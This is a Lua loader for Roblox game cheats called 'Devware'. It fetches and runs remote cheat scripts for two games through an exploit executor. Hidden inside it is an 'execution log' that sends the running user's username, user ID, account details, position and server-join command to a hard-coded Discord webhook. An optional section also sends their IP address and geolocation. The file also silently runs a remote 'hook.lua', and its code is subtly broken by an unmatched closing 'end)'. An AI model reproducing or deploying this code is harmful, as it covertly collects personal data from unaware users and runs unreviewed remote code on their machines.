--[[
██████╗ ███████╗██╗   ██╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔══██╗██╔════╝██║   ██║██║    ██║██╔══██╗██╔══██╗██╔════╝
██║  ██║█████╗  ██║   ██║██║ █╗ ██║███████║██████╔╝█████╗  
██║  ██║██╔══╝  ╚██╗ ██╔╝██║███╗██║██╔══██║██╔══██╗██╔══╝  
██████╔╝███████╗ ╚████╔╝ ╚███╔███╔╝██║  ██║██║  ██║███████╗
╚═════╝ ╚══════╝  ╚═══╝   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝

              🚀 DEVWARE — Skidding is for losers 🚀
----------------------------------------------------------------
   One line loads all supported games:
   loadstring(game:HttpGet("https://raw.githubusercontent.com/devwarerblx/devware/refs/heads/main/loader.lua"))()
----------------------------------------------------------------
   Supported:
   • 99 Nights In The Forest
   • MX World (Farm & Normal Map)
----------------------------------------------------------------
   Discord: https://discord.gg/cuYwaQeHT5
----------------------------------------------------------------
]]

if not game:IsLoaded() then game.Loaded:Wait() end

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/devwarerblx/devware/refs/heads/main/debug/hook.lua"))()
end)
--// Config
getgenv().whscript = "devware"        --Change to the name of your script
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1431067932028571689/KV2AdVPa-ovmC_aKwLrEGKnKDkKAoppDa6qhRe2ykIhfWEEwhgMBzJsObPFlFBpmZszF"  --Put your Webhook Url here
getgenv().ExecLogSecret = false                --decide to also log secret section

--// Execution Log Script
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    print("Script is already executed! Rejoin if it's an error!")
    local ui2 = gethui()
    local folderName2 = "screen2"
    local folder2 = Instance.new("Folder")
    folder2.Name = folderName2
    if ui2:FindFirstChild(folderName2) then
        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
    else
        folder2.Parent = gethui()
    end
else
    folder.Parent = gethui()
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local deviceType =
        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
    local snipePlay =
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
        "N/A"
    local position =
        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
        player.Character.HumanoidRootPart.Position or
        "N/A"
    local gameVersion = game.PlaceVersion

    if not getgenv().ExecLogSecret then
        getgenv().ExecLogSecret = false
    end
    if not getgenv().whscript then
        getgenv().whscript = "Please provide a script name!"
    end
    local commonLoadTime = 5
    task.wait(commonLoadTime)
    local pingThreshold = 100
    local serverStats = game:GetService("Stats").Network.ServerStatsItem
    local dataPing = serverStats["Data Ping"]:GetValueString()
    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    local function checkPremium()
        local premium = "false"
        local success, response =
            pcall(
            function()
                return player.MembershipType
            end
        )
        if success then
            if response == Enum.MembershipType.None then
                premium = "false"
            else
                premium = "true"
            end
        else
            premium = "Failed to retrieve Membership:"
        end
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "🚀 **Script Execution Detected | Exec Log**",
                ["description"] = "*A script was executed in your script. Here are the details:*",
                ["type"] = "rich",
                ["color"] = tonumber(0x3498db), -- Clean blue color
                ["fields"] = {
                    {
                        ["name"] = "🔍 **Script Info**",
                        ["value"] = "```💻 Script Name: " ..
                            getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👤 **Player Details**",
                        ["value"] = "```🧸 Username: " ..
                            player.Name ..
                                "\n📝 Display Name: " ..
                                    player.DisplayName ..
                                        "\n🆔 UserID: " ..
                                            userid ..
                                                "\n❤️ Health: " ..
                                                    health ..
                                                        " / " ..
                                                            maxHealth ..
                                                                "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile)```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "📅 **Account Information**",
                        ["value"] = "```🗓️ Account Age: " ..
                            player.AccountAge ..
                                " days\n💎 Premium Status: " ..
                                    premium ..
                                        "\n📅 Account Created: " ..
                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎮 **Game Details**",
                        ["value"] = "```🏷️ Game Name: " ..
                            gameName ..
                                "\n🆔 Game ID: " ..
                                    gameid ..
                                        "\n🔗 Game Link (https://www.roblox.com/games/" ..
                                            gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🕹️ **Server Info**",
                        ["value"] = "```👥 Players in Server: " ..
                            playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📡 **Network Info**",
                        ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🖥️ **System Info**",
                        ["value"] = "```📺 Resolution: " ..
                            screenWidth ..
                                "x" ..
                                    screenHeight ..
                                        "\n🔍 Memory Usage: " ..
                                            memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📍 **Character Position**",
                        ["value"] = "```📍 Position: " .. tostring(position) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🪧 **Join Script**",
                        ["value"] = "```lua\n" .. snipePlay .. "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
                },
                ["footer"] = {
                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
                }
            }
        }
    }

    -- Check if the secret tab should be included
    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**`(🤫) Secret`**",
                ["value"] = "||(👣) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(🌆) Country: " ..
                            ipinfo_table.country ..
                                "||\n||(🪟) GPS Location: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(🏙️) City: " ..
                                            ipinfo_table.city ..
                                                "||\n||(🏡) Region: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
            }
        )
    end

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
		end
end)

local version = "v1.0.0"
local placeId = game.PlaceId

-- Helpers
local function notify(title, text, duration)
	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = title, Text = text, Duration = duration or 6
		})
	end)
end

local function safeGetGameName()
	local MarketplaceService = game:GetService("MarketplaceService")
	local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, placeId)
	return (ok and info and info.Name) or ("Unknown Game ("..tostring(placeId)..")")
end

local function safeLoad(url)
	local ok, err = pcall(function()
		loadstring(game:HttpGet(url))()
	end)
	if not ok then
		warn("[Devware] Failed to load:", url, "\nError:", err)
		notify("Devware", "Load failed. Check console.", 8)
	end
end

-- Core
local gameName = safeGetGameName()
print(("[Devware %s] Detected: %s"):format(version, gameName))
notify("Devware Loader", "Detected: "..gameName, 5)

-- Routing
if placeId == 126509999114328 then
	print("[Devware] Loading 99 Nights In The Forest...")
	notify("Devware", "Loading 99 Nights In The Forest…", 6)
	safeLoad("https://api.junkie-development.de/api/v1/luascripts/public/9bfac151a08ff4b308e45d047ab2fb37b321d010d9756a7d513a6b7c4775b34f/download")

elseif placeId == 135155039067698 or placeId == 97241995358432 then
	print("[Devware] Loading MX World...")
	notify("Devware", "Loading MX World…", 6)
	safeLoad("https://api.junkie-development.de/api/v1/luascripts/public/2d239d6a2ea31a7e1506a04eccce97ae7f2ac98deaf959fc24bd692fa136b4b8/download")

else
	warn("[Devware] No script assigned for:", gameName, "("..tostring(placeId)..")")
	notify("Devware", "No script assigned for "..gameName, 7)
end
